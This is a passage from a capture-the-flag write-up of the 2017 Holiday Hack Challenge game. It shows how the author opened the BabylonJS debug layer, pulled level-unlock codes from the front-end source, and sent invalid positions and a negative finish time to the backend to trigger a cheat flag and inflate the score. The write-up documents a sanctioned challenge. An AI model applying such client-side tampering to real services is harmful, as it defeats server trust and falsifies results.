You see, I cast a magic spell on the Abominable Snow Monster to make him throw all the snowballs at the North Pole. Why? Because I knew a giant snowball fight would stir up hostilities between the Elves and the Munchkins, resulting in all-out WAR between Oz and the North Pole. I was going to sell my magic and spells to both sides. War profiteering would mean GREAT business for me.
But, alas, you and your sleuthing foiled my venture. And I would have gotten away with it too, if it weren't for you meddling kids!
```

![glinda](./images/villain-glinda-proof.png)

##### Solution

The villain causing the giant snowball problem is `Glinda the Good Witch of Oz`, and the motive was to stir up hostilities between
Elves and Munchkins, creating a war between Oz and the North Pole, the motivation being war profiteering.


#### The Game

##### Questions

  - What can we alter to the front-end remaining in-scope to
    reveal elements, disable fog, disable obstructions of view and change game state ?

##### Process / Solution

Looking at the front-end, most of the code is made with Ember, we can use the Ember Inspector Chrome extension,
but that doesn't help a lot because most of the game is in a webgl context.

After looking further, we can see when playing the game, in the network tab the front-end code comes down
through an AJAX call.  This code is called  `hhc17-core-frontend.js` (this turned into `vendor.js` later on)
, and if we look in the sources tab we can use Chrome's built-in 'Pretty Print' ability to cleaup the minified code.

After a while it becomes apparent the library used for the WebGL drawing is [BabylonJS](https://www.babylonjs.com/).

Looking up if they have a debug panel, we're in luck! - https://doc.babylonjs.com/how_to/debug_layer
We can even test it on one of their samples - https://www.babylonjs.com/demos/yeti/
Just have to open the console and enter: `scene.debugLayer.show()`

Apparently, it's also the first item on their tutorial list - https://doc.babylonjs.com/how_to

With the debug layer we get a lot of great features!

- Turn on/off fog
- Turn on/off visibility of any object
- Query all meshes in the scene
- Change the camera so it is not locked
- Change locations of objects
- Select a mesh from the scene dynamically
- View all textures used
- Capture any debug messages in the scene

![debug panel](./images/debug-panel.png)

This was particularly helpful for the level "I don't think we're in Kansas anymore" where the
poppy field is covering all the waypoints.  Disabling the poppies was invaluable while playing
the level to hit everything properly.  It was also possible to travel underneath the level where
the second town was.

![poppies disabled](./images/poppy-disable.png)

To enable debugging, one does not simply call `scene.debugLayer.show()` from the console.  First
a breakpoint must be set where the scene exists.  To do this I first started placing breakpoints when
a tool was placed, but this got annoying fairly quickly.  The more reliable breakpoint is on `initializeScene`.
Looking for `initializeScene` will yield many results, instead look for:

```js
this.scene.onPointerDown = this.onPointerDown.bind(this),
```

This is a unique location where a breakpoint can be set, and `scene.debugLayer.show()` may be called.

##### Other interesting findings

You are able to unlock levels with the following codes:

```js
var r = {
  unlocked_landing: "00000000-0000-0000-0000-000000000000",
  unlocked_cliffs: "11111111-1111-1111-1111-111111111111",
  unlocked_cryokinetic: "22222222-2222-2222-2222-222222222222",
  unlocked_home: "33333333-3333-3333-3333-333333333333"
}
```

Terminal challenges live on a different host using this url scheme:

```js
"https://docker2017.holidayhackchallenge.com/?challenge=" + this.get("currentUser.current_level") + "&uid=" + this.get("currentUser.user.id")
```

Left-over testing data which didn't end up in the final game:

```js
{
  name:"greatbook",
  desc:"Make Nicolas Cage proud.",
  theMaths: "100 points for hitting the exit after retrieving the page from The Great Book."
}
```

```js
{
  name: "kite",
  desc: "Free the kite from the windmill.",
  theMaths: "100 points for living the impossible dream"
}
```

It looks like the `kitepart` was attached to `blade1`, which can be found on the windmill for the level "I don't think we're in Kansas anymore":

```js
this.scene.getMeshByName("kitepart").setPhysicsLinkWith(this.scene.getMeshByName("blade1"), new c.Vector3(-2,-.2,0), new c.Vector3(-1.5,-3.5,1))
```

"We're off to see the...":
The objects used in the last level are hovering way above the level, and if you weren't able to grab the ramp earlier in the game
it is also shown on the top.

![floating-items](./images/floating-items.png)

##### Extra point challenge

There was also a nice extra point challenge which was removed later, but it was fun to get regardless!
The front-end would post all the positions of objects in the game to the backend to verify when a game was completed.
If any of the asset positions were invalid it would mark the `shenanigans` flag to true, notifying the front-end that
there was some cheating taking place.  The goal was to cheat to gain an achievement.  Sending back an invalid position
ended up counting as a cheat:

![shenanigans](./images/xmas-time.png)

Another thing was interesting, if you set the finish time to be negative, it would give you a TON of extra points, because
of the bonus you get for every half-second remaining.

![Huge Score](./images/real-points.png)


#### Conclusion

![levels](./images/all-levels-complete.png)
![stats](./images/maxed-out.png)
![leaderboard](./images/leaderboard.png)

I played this game with the username `fadec0d3`, ended up getting 85/85 points, and very happy with the outcome!

I'd like to Thank all the creators / contributors of Holiay Hack Challenge!  Everything was well designed and worked fairly smoothly.
It included learning experiences and a lot of interaction with the community along the way!

Had a ton of fun playing, and I look forward to next year's challenges!

Thank You!!!!
